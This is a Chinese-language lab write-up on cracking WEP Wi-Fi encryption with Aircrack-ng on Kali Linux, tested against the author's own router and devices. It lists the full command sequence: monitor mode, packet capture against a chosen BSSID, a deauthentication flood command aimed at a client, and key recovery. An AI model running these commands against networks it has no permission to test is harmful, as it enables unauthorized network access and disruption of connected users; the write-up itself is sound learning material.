# Wireless - WEP Cracking by Aircrack-ng

Created by : Mr Dk.

2018 / 12 / 04 16:48

Nanjing, Jiangsu, China

---

## Tools

_Aircrack-ng_ on _Kali Linux x64_

_Aircrack-ng_ 是一个分析 _IEEE 802.11_ 标准网络的安全软件

主要功能包括：

* 网络侦测
* 数据包嗅探
* _WEP_、_WPA_、_WPA2_ 破解

---

## Procedure

#### 将路由器配置为 _WEP_ 加密模式

![wep-crk-router](../img/wep-crk-router.png)

为了简单起见，将密钥设置为 `12345`

### 插入无线网卡并查看是否被 _OS_ 识别

```console
$ ifconfig
```

![wep-crk-init](../img/wep-crk-init.png)

可以看到插入的 _USB_ 网卡已被识别，并被命名为 `wlan0`

### 将网卡设置为监控模式

```console
$ airmon-ng start wlan0
```

![wep-crk-mon](../img/wep-crk-mon.png)

### 查看网卡是否已进入监控模式

```console
$ ifconfig
```

![wep-crk-ifconfig](../img/wep-crk-ifconfig.png)

可以看到 `wlan0` 网卡进入监控模式后被命名为 `wlan0mon`

### 使用网卡监控空间内的无线网络通信状态

```console
$ airodump-ng wlan0mon
```

![wep-crk-target](../img/wep-crk-target.png)

从所有的设备中选择要破解的目标

### 抓取攻击目标的数据包

```console
$ airodump-ng -w test -c 11 --bssid 00:6B:8E:5E:7E:E8 wlan0mon
```

参数信息：

* `-w` 表示数据包写入的文件路径
* `-c` 表示监听的信道 _channel_
* `--bssid` 表示监听设备的 _MAC_ 地址
* 最后一个参数为网卡名

![wep-crk-pkg](../img/wep-crk-pkg.png)

可以看到选定的目标 _AP_ - `Mr.Drivingduck` 的加密方式为 _WEP_

有两个客户端连接到了该 _AP_ 上 - 分别是我的 `iPhone X` & `Surface Pro`

### 获取大量数据包

获取的数据包越多，获取到的 _IV_ 值就越多，破解的概率就越大

可以对连接到该 _AP_ 的客户端使用 __洪泛解除认证攻击__，迫使客户端发送重新连接的数据包，从而获得更多数据包

```console
$ aireplay-ng -0 10 -a 00:6B:8E:5E:7E:E8 -c B8:C1:11:02:B7:05 wlan0mon
```

参数信息：

* `-0` 表示洪泛攻击，之后表示洪泛攻击的次数
* `-a` 表示被攻击 _AP_ 的 _MAC_ 地址
* `-c` 表示被攻击客户端设备的 _MAC_ 地址
* 最后一个参数为网卡名

为了方便，我没有使用洪泛攻击的方式获取大量数据包

我使用的方法是，用 `Surface Pro` 开启百度云盘下载一个很大的文件，从而发出大量数据包

### 利用抓取到的数据包进行破解

```console
$ aircrack-ng -a 1 test-01.cap
```

参数信息：

* `-a` 表示破解模式，`1` 表示 _WEP_ 破解
* 最后的参数为抓取到的数据包文件

![wep-crk-result](../img/wep-crk-result.png)

总共利用了 `27563` 个数据包，破解出了 `5` 位的 _WEP_ 密钥

如果使用 `13` 位密钥，可能需要抓取更多数据包

---

## Summary

亲身体验了一次当黑客的感觉

_WEP_ 确实是一个很弱的加密方式

在嗅探到的所有设备里

除了我自己人为设定为 _WEP_ 加密的 _AP_

其余设备都使用 _WPA2_ 加密

但是这款软件可以将网卡设置为 __监控模式__

还可以发起 __解除认证洪泛攻击__

我认为可以用来测试 _kismet_ 的攻击报警模块

待实验验证

---

